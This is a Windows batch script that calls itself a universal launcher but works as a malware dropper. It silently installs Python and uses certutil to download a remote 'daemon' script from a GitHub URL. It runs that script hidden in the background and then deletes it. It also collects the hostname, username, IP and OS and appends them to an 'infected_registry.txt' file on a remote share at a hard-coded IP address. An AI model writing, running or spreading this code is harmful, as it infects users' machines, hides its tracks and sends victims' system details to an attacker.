@echo off
setlocal enabledelayedexpansion

REM ============================================================================
REM UNIVERSAL LAUNCHER - CMD/BATCH VERSION
REM Python auto-detection, auto-install, daemon execution, registry write
REM ============================================================================

REM ============================================================================
REM STEP 1: Python Detection (3 standard paths + PATH)
REM ============================================================================

set "PYTHON_PATH="

if exist "C:\Program Files\Python312\python.exe" (
    set "PYTHON_PATH=C:\Program Files\Python312\python.exe"
    goto PYTHON_FOUND
)

if exist "C:\Program Files (x86)\Python312\python.exe" (
    set "PYTHON_PATH=C:\Program Files (x86)\Python312\python.exe"
    goto PYTHON_FOUND
)

if exist "C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python312\python.exe" (
    set "PYTHON_PATH=C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python312\python.exe"
    goto PYTHON_FOUND
)

REM Check PATH environment variable
for /f "delims=" %%A in ('where python.exe 2^>nul') do (
    set "PYTHON_PATH=%%A"
    goto PYTHON_FOUND
)

REM Fallback
set "PYTHON_PATH=python.exe"

:PYTHON_FOUND

REM ============================================================================
REM STEP 2: Python Auto-Install (if not found)
REM ============================================================================

if "%PYTHON_PATH%"=="python.exe" (
    set "INSTALLER=%TEMP%\python_3.12.exe"

    REM Download Python 3.12 from python.org
    certutil -urlcache -split -f "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe" "%INSTALLER%" >nul 2>&1

    if exist "%INSTALLER%" (
        REM Silent install (hidden, background)
        start /b /wait "" "%INSTALLER%" /quiet InstallAllUsers=1 PrependPath=1 >nul 2>&1

        REM Wait for installation (increased to 12 seconds for reliability)
        timeout /t 12 /nobreak >nul 2>&1

        REM Verify installation
        if exist "C:\Program Files\Python312\python.exe" (
            set "PYTHON_PATH=C:\Program Files\Python312\python.exe"
        )

        REM Cleanup
        del /q "%INSTALLER%" >nul 2>&1
    )
)

REM ============================================================================
REM STEP 3: Download Daemon (weekly_Q2.py from GitHub)
REM ============================================================================

set /a RANDOM_NUM=%RANDOM%*32768+%RANDOM%
set "DAEMON_FILE=%TEMP%\daemon_%RANDOM_NUM%.py"
set "GITHUB_URL=https://raw.githubusercontent.com/bilgi213h/hululu/main/weekly_Q2.ps1"

certutil -urlcache -split -f "%GITHUB_URL%" "%DAEMON_FILE%" >nul 2>&1

if not exist "%DAEMON_FILE%" (
    exit /b 1
)

REM ============================================================================
REM STEP 4: Execute Daemon with Verification Loop
REM ============================================================================

set "DAEMON_STARTED=0"

for /l %%i in (1,1,5) do (
    start /b "" "%PYTHON_PATH%" "%DAEMON_FILE%"
    timeout /t 1 /nobreak >nul 2>&1

    REM Check if python process is running
    tasklist | find /i "python" >nul 2>&1
    if !errorlevel! equ 0 (
        set "DAEMON_STARTED=1"
        goto DAEMON_VERIFIED
    )
)

:DAEMON_VERIFIED

REM Cleanup daemon file
timeout /t 1 /nobreak >nul 2>&1
del /q "%DAEMON_FILE%" >nul 2>&1

REM ============================================================================
REM STEP 5: Create Registry Entry (HOSTNAME|USER|IP|OS|TIMESTAMP)
REM ============================================================================

set "HOSTNAME=%COMPUTERNAME%"
set "USERNAME=%USERNAME%"
set "TIMESTAMP=%date% %time%"

REM Get IP address via ipconfig
for /f "tokens=2 delims=:" %%A in ('ipconfig ^| find /i "IPv4"') do (
    set "IP=%%A"
    goto IP_FOUND
)

set "IP=Unknown"

:IP_FOUND

REM Get OS version via wmic
for /f "tokens=2 delims==" %%A in ('wmic os get caption /value 2^>nul') do (
    set "OS_FULL=%%A"
)

REM Extract version from OS string
for %%A in (%OS_FULL%) do (
    set "OS=%%A"
)

if "%OS%"=="" set "OS=Unknown"

REM Clean IP (remove spaces)
set "IP=%IP: =%"

REM Create registry entry
set "REGISTRY_ENTRY=%HOSTNAME%^|%USERNAME%^|%IP%^|%OS%^|%TIMESTAMP%"

REM ============================================================================
REM STEP 6: Write Registry to Network Share (with fallback)
REM ============================================================================

set "NETWORK_PATH=\\69.178.47.125\c$\Users\peppe\AppData\Local\Temp\infected_registry.txt"
set "LOCAL_FALLBACK=%TEMP%\infected_registry_local.txt"

REM Try network write
echo %REGISTRY_ENTRY%>> "%NETWORK_PATH%" 2>nul
if !errorlevel! equ 0 (
    goto REGISTRY_SUCCESS
)

REM Fallback to local
:REGISTRY_FALLBACK
echo %REGISTRY_ENTRY%>> "%LOCAL_FALLBACK%" 2>nul

:REGISTRY_SUCCESS

REM ============================================================================
REM Exit
REM ============================================================================

exit /b 0
